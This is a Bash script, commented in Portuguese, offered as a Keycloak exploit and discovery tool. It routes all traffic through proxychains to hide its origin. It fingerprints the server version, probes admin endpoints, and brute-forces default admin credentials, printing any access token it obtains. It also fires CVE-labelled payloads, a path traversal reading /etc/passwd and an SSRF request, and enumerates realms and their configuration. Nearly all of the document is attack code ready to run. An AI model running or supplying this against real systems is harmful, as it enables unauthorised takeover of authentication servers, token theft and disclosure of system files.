#!/bin/bash
# Keycloak Exploit & Discovery
echo "=== KEYCLOAK EXPLOIT ==="

if [ -z "$1" ]; then
    echo "Uso: $0 <KEYCLOAK_URL>"
    echo "Exemplo: $0 https://auth.example.com"
    exit 1
fi

URL="$1"
echo "Testando Keycloak: $URL"

# Descobrir versão
echo -e "\n[1] Descobrindo versão..."
version=$(proxychains4 -q curl -s "$URL/auth/" | grep -oP 'Keycloak [0-9]+\.[0-9]+\.[0-9]+' | head -1)
echo "Versão encontrada: $version"

# Endpoints comuns
echo -e "\n[2] Testando endpoints..."
ENDPOINTS=(
    "/auth/admin/"
    "/auth/admin/master/console/"
    "/auth/realms/master"
    "/auth/realms/master/.well-known/openid_configuration"
    "/auth/admin/realms"
    "/auth/admin/serverinfo"
    "/auth/js/keycloak.js"
    "/auth/welcome"
)

for endpoint in "${ENDPOINTS[@]}"; do
    status=$(proxychains4 -q curl -s -o /dev/null -w "%{http_code}" "$URL$endpoint")
    echo "$endpoint: HTTP $status"
    if [ "$status" = "200" ]; then
        echo "  ✓ ACESSÍVEL"
    fi
done

# Testar credenciais padrão
echo -e "\n[3] Testando credenciais padrão..."
CREDS=(
    "admin:admin"
    "admin:password"
    "admin:123456"
    "keycloak:keycloak"
    "root:root"
    "admin:"
)

for cred in "${CREDS[@]}"; do
    user=$(echo "$cred" | cut -d':' -f1)
    pass=$(echo "$cred" | cut -d':' -f2)
    echo "Testando: $user:$pass"
    
    response=$(proxychains4 -q curl -s -X POST "$URL/auth/realms/master/protocol/openid-connect/token" \
        -H "Content-Type: application/x-www-form-urlencoded" \
        -d "grant_type=password&client_id=admin-cli&username=$user&password=$pass")
    
    if echo "$response" | grep -q "access_token"; then
        echo "  ✓ CREDENCIAIS VÁLIDAS: $user:$pass"
        echo "$response" | grep -o '"access_token":"[^"]*"'
    fi
done

# CVEs conhecidos
echo -e "\n[4] Testando CVEs conhecidos..."

# CVE-2020-1758 (Path traversal)
echo "Testando CVE-2020-1758..."
proxychains4 -q curl -s "$URL/auth/realms/master/protocol/openid-connect/auth?scope=openid&response_type=code&redirect_uri=valid&state=cfx&nonce=cfx&client_id=security-admin-console&request_uri=http://localhost%23/../../../../../etc/passwd"

# CVE-2018-14655 (SSRF)
echo "Testando CVE-2018-14655..."
proxychains4 -q curl -s "$URL/auth/realms/master/broker/oidc/endpoint?code=test&state=http://localhost:8080/auth/admin/"

# Enumerar realms
echo -e "\n[5] Enumerando realms..."
COMMON_REALMS=(
    "master"
    "demo"
    "test"
    "dev"
    "prod"
    "app"
    "api"
    "web"
    "mobile"
)

for realm in "${COMMON_REALMS[@]}"; do
    status=$(proxychains4 -q curl -s -o /dev/null -w "%{http_code}" "$URL/auth/realms/$realm")
    if [ "$status" = "200" ]; then
        echo "REALM ENCONTRADO: $realm"
        # Tentar obter configuração
        proxychains4 -q curl -s "$URL/auth/realms/$realm/.well-known/openid_configuration" | jq . 2>/dev/null || echo "Configuração não disponível"
    fi
done